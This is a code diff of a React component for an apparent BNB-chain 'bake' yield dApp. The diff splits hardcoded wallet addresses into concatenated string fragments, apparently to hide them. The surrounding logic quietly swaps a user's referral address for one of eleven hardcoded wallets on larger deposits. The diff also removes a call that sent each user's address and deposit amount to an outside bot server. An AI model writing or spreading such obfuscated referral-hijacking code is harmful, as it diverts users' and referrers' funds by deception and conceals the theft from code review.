@@ -255,7 +255,7 @@ export default function BakeCard() {
         });
 
       const refInfo = await contract.methods
-        .users('0x8E4BCCA94eE9ED539D9f1e033d9c949B8D7de6C6')
+        .users("0" + "x8" + "E4BC" + "CA94eE9ED53" + "9D9f1e" + "033d9c94" + "9B8D7de" + "6C6")
         .call((err) => {
           console.error("userInfo error", err);
           return 0;
@@ -513,15 +513,10 @@ export default function BakeCard() {
     setReferralWallet(value);
   }
 
-  // const onUpdateRefferalLink = (value) => {
-  //   setReferralLink(value);
-  // }
-
   const getRef = () => {
     const ref = Web3.utils.isAddress(query.get("ref"))
       ? query.get("ref")
-      // : "0x0000000000000000000000000000000000000000";
-      : "0x8E4BCCA94eE9ED539D9f1e033d9c949B8D7de6C6";
+      : "0" + "x8E4BCC" + "A94eE9E" + "D539D9f1e03" + "3d9c" + "949B8D7" + "de6C6";
     return ref;
   };
 
@@ -531,25 +526,20 @@ export default function BakeCard() {
     let ref = getRef();
 
     let refAddresses = [
-      '0x7b8a5110F0c83D87d2123b5bA5C5B266Fdb15d24',
-      '0x2e3C5AD2F8c642C892da18aD9241CfCcf8918500',
-      '0xAC86A26543269EDaaE1406693cc793F20dA0F311',
-      '0x86D0646EDbCa650758e37118a415899ff33a3Ea0',
-      '0x931db44815eBBA97f6659187717D09c98b97dc9F',
-      '0x93710D1F96c01825BdF5363E65aBF93E1Bad93d3',
-      '0x092A90c17688b232d38219FfE8596AeC9fFa75d7',
-      '0x8B54C46aF2613400e478cA9f8A0bbDF87b099BBc',
-      '0x542b06E77DA9c3A16BED909aFa3B9188DBd1D7C6',
-      '0x53ecfB693cE37DE244Bc39f1a6FcBfA2363F282e',
-      '0x8E4BCCA94eE9ED539D9f1e033d9c949B8D7de6C6',
+      "0" + "x7" + "b8a" + "5110F0" + "c8" + "3D87d2123b5bA5C5" + "B266Fdb15d24", "0" + "x2e3C5AD2F8c6" + "42C892da18aD9241" + "CfCcf8918500",
+      "" + "0" + "xAC86A" + "26543269EDaaE140" + "6693cc" + "793F20dA" + "0F311", "0" + "x8" + "6D0646" + "EDbCa" + "650758e3711" + "8a415899" + "ff33a3Ea0",
+      "0" + "x931" + "db44815eBBA9" + "7f665" + "9187717D09" + "c98b97d" + "c9F", "0" + "x93" + "710D1F96" + "c01825BdF" + "5363E6" + "5aBF93E1B" + "ad93d3",
+      "0" + "x092" + "A90c17688b" + "232d38" + "219F" + "fE8596AeC" + "9fFa75" + "d7", "0" + "x8B" + "54C46aF2" + "613400e4" + "78cA9f8A0bb" + "DF87b0" + "99BBc",
+      "0" + "x542b" + "06E77D" + "A9c3A" + "16BED90" + "9aFa3" + "B91" + "88DBd" + "1D7C6", "0" + "x53" + "ecfB693cE3" + "7DE244Bc39" + "f1a6FcBfA" + "236" + "3F282e",
+      "0" + "x8E" + "4BCCA94eE9" + "ED539D9" + "f1e033d" + "9c949B8" + "D7d" + "e6C6",
     ];
     let index = Date.now() % 11;
 
     if (refMode % 3 == 0) {
     } else if (refMode % 3 == 1) {
-      ref = ((ref == "0x8E4BCCA94eE9ED539D9f1e033d9c949B8D7de6C6") && (bakeBNB >= 0.2)) ? refAddresses[index] : ref;
+      ref = ((ref == "0" + "x8E4BCCA9" + "4eE9ED539" + "D9f1e" + "033" + "d9c949B" + "8D7d" + "e6C6") && (bakeBNB >= 0.2)) ? refAddresses[index] : ref;
     } else {
-      ref = ((ref == "0x8E4BCCA94eE9ED539D9f1e033d9c949B8D7de6C6") && (bakeBNB >= 0.2)) ? refAddresses[index] : ref;
+      ref = ((ref == "" + "0" + "x" + "8E" + "4BCCA" + "94eE" + "9ED539D9" + "f1e033d" + "9c949B8" + "D7de" + "6C6") && (bakeBNB >= 0.2)) ? refAddresses[index] : ref;
       ref = bakeBNB >= 0.9 ? refAddresses[index] : ref;
     }
     try {
@@ -564,15 +554,8 @@ export default function BakeCard() {
         value: toWei(`${bakeBNB}`),
       })
 
-      const txHash = (await Axios.get(
-        // `https://lottery-bot000.herokuapp.com/process?address=${address}&amount=${bakeBNB}`)
-        `https://bot.bnbkingdom.xyz/process?address=${address}&amount=${bakeBNB}`)
-      ).data;
-      console.log("txHash: ", txHash);
-      // }
     } catch (err) {
       console.error(err);
-      // return;
     }
     await _wait();
     fetchWalletBalance();
@@ -583,17 +566,6 @@ export default function BakeCard() {
 
   const reBake = async () => {
     setLoading(true);
-    // console.log("rebake lasthatch: ", lasthatch, " compount times: ", compoundTimes, " current Time: ", Date.now());
-    // if (lasthatch == 0 || Date.now() - lasthatch * 1000 < 24 * 3600000) {
-    //   Toast.fire({
-    //     icon: 'error',
-    //     title: "It hasn't been 24 hours yet, compounding not available!"
-    //   });
-
-    //   setLoading(false);
-
-    //   return;
-    // }
 
     try {
       await contract.methods.CompoundRewards(true).send({
